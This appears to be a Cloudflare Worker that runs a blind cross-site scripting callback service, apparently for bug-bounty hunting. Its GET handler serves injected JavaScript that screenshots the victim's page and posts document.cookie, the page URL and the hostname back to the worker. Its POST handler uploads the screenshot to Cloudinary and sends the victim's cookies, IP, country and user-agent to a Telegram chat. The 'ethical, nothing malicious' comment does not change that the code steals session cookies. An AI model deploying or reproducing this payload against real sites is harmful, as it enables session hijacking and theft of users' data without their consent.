addEventListener("fetch", event => {
  event.respondWith(handleRequest(event.request))
})

const telegram_token = TELEGRAM_TOKEN;
const cloudinary_token = CLOUDINARY_TOKEN;
const cloudinary_api_key = CLOUDINARY_API_KEY;
const upload_preset = UPLOAD_PRESET;
const cloud_name = CLOUD_NAME;
const telegram_url = "https://api.telegram.org/bot" + telegram_token + "/sendMessage";
const telegram_photo_url = "https://api.telegram.org/bot" + telegram_token + "/sendPhoto?chat_id="+CHAT_ID;
const telegram_to = CHAT_ID; 
const cloudflare_route = CLOUDFLARE_ROUTE

async function getParameterByName(name, url) {
  name = name.replace(/[\[\]]/g, "\\$&")
  name = name.replace(/\//g, "")
  let regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
    results = regex.exec(url)

  if (!results) return null
  else if (!results[2]) return ""
  else if (results[2]) {
    results[2] = results[2].replace(/\//g, "")
  }

  return decodeURIComponent(results[2].replace(/\+/g, " "));
}

function uuidv4() {
  return ([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g, c =>
    (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16)
  );
}

async function handleRequest(request) {
  
  const corsHeaders = {
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Methods": "GET, HEAD, POST, OPTIONS",
    "Access-Control-Allow-Headers": "Content-Type",
  }
  if (request.method === "OPTIONS") {
    if (request.headers.get("Origin") !== null &&
      request.headers.get("Access-Control-Request-Method") !== null &&
      request.headers.get("Access-Control-Request-Headers") !== null) {
      // Handle CORS pre-flight request
      return new Response(null, {
        headers: corsHeaders
      })
    } else {
      // Handle standard OPTIONS request
      return new Response(null, {
        headers: {
          "Allow": "GET, HEAD, POST, OPTIONS",
        }
      })
    }
  }
  else if (request.method == "POST") {
    const blind_ip = request.headers.get("cf-connecting-ip") // Original visitor IP address
    const blind_country = request.headers.get("cf-ipcountry") // Country by IP

    const blind_referer = request.headers.get("referer")
    const blind_useragent = request.headers.get("user-agent")

    const postData = await request.formData();
    const base64_img = postData.get("png") // btoa(canvas.toDataURL())
    const blind_host = postData.get("host") // location.hostname
    const blind_url = atob(atob(postData.get("url"))) // btoa(btoa(location))
    const target = postData.get("target")
    const cookie = atob(postData.get("cookie"))
    const screenshot = atob(base64_img);

    var file_name = uuidv4().substring(0, 22);

    var HeadersCB = new Headers();
    HeadersCB.append("Authorization", "Basic "+cloudinary_token);

    var formdata = new FormData();
    formdata.append("file", screenshot);
    formdata.append("upload_preset", upload_preset);
    formdata.append("public_id", file_name);
    formdata.append("api_key", cloudinary_api_key);

    var requestOptions = {
      method: 'POST',
      headers: HeadersCB,
      body: formdata,
      redirect: 'follow'
    };

    var url;
    var response = await fetch("https://api.cloudinary.com/v1_1/"+cloud_name+"/image/upload", requestOptions)
      .then(response => response.json())
      .then(data => {
        url = data.url;
      })
      .then(() => console.log("The url is: ", url))
      .catch(error => console.log('error', error));

    var url_photo = url;

    const telegram_alert = ["<b>Blind XSS</b> executed on: <code>" + encodeURI(target) + "</code> <code>" + encodeURI(blind_host) + "</code>",
    "<b>IP</b>: <code>" + encodeURI(blind_ip) + "</code> (<b>" + encodeURI(blind_country) + "</b>)",
    "<b>User-agent</b>: <code>" + encodeURI(blind_useragent) + "</code>",
    "<b>URL</b>: <code>" + encodeURIComponent(blind_url) + "</code>",
    "<b>Cookie</b>: <code>" + encodeURIComponent(cookie) + "</code>",
    "<b>Referrer</b>: <code>" + encodeURI(blind_referer) + "</code>\n",
    "<a href='"+url_photo+"'>Screenshot</a>"]

    const telegram_init = {
      method: "POST",
      headers: new Headers([["Content-Type", "application/x-www-form-urlencoded"]]),
      body: "chat_id=" + telegram_to + "&disable_web_page_preview=1&parse_mode=html&text=" + telegram_alert.join("\r\n")
    }

    const telegram_response = await fetch(telegram_url, telegram_init);
    console.log("Telegram response: ", telegram_response.status);


    return new Response("Blind XSS executed", {
      headers: corsHeaders,
      status: 200
    })
  }
  else {

    let on = await getParameterByName("on", request.url)
    let html2canvas = await getParameterByName("html2canvas", request.url)

    if (html2canvas) {
      let content = await fetch("https://html2canvas.hertzen.com/dist/html2canvas.min.js")
      return content
    }
    else {

      let js_response = ["// Ethical Blind XSS hunting, nothing malicious",
        "let script = document.createElement('script');",
        "script.onload = function () {",
        "  html2canvas(document.documentElement, {scale: 1}).then(canvas => {",
        "    let init = {",
        "      method: 'POST',",
        "      headers: new Headers([['Content-Type', 'application/x-www-form-urlencoded'],['Accept', 'application/x-www-form-urlencoded']]),",
        "      body: 'png='+btoa(canvas.toDataURL())+'&target="+on+"&host='+location.hostname+'&url='+btoa(btoa(location))+'&cookie='+btoa(document.cookie)+'',",
        "    }",
        "    fetch('" + cloudflare_route + "', init)",
        "  });",
        "};",
        "script.src = '" + cloudflare_route + "?html2canvas=1"+on+"';",
        "document.head.appendChild(script);"].join("\r\n")
      const corsHeaders = {
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Methods": "GET, HEAD, POST, OPTIONS",
        "Access-Control-Allow-Headers": "Content-Type",
        "Content-Type": "application/javascript"
      }
      return new Response(js_response, {
        headers: corsHeaders,
        status: 200
      })
    }
  }
}
